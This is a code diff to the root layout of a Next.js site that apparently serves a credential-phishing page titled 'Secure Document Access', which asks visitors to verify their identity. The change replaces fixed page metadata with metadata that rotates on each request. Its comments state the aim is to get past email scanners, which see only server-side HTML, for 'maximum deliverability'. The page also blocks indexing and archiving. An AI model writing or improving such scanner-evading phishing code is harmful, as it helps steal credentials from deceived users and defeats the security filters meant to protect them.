@@ -1,18 +1,32 @@
 import type { Metadata } from 'next'
 import './globals.css'
+import { getOptimizedMetadata } from '@/lib/rendering/metadataOptimization'
 
-export const metadata: Metadata = {
-  title: 'Secure Document Access',
-  description: 'Verify your identity to access secure documents',
-  icons: {
-    icon: '/favicon.ico',
-  },
-  robots: {
-    index: false,
-    follow: false,
-    noarchive: true,
-    nosnippet: true,
-  },
+// Generate dynamic metadata with rotation (server-side only)
+// Email scanners only see server-side HTML, not client-side JavaScript
+export function generateMetadata(): Metadata {
+  // Rotate metadata based on request (server-side only for maximum deliverability)
+  const rotatedMetadata = getOptimizedMetadata(Date.now())
+  
+  return {
+    title: rotatedMetadata.title,
+    description: rotatedMetadata.description,
+    keywords: rotatedMetadata.keywords,
+    openGraph: {
+      title: rotatedMetadata.ogTitle || rotatedMetadata.title,
+      description: rotatedMetadata.ogDescription || rotatedMetadata.description,
+      type: 'website',
+    },
+    icons: {
+      icon: '/favicon.ico',
+    },
+    robots: {
+      index: false,
+      follow: false,
+      noarchive: true,
+      nosnippet: true,
+    },
+  }
 }
 
 export default function RootLayout({
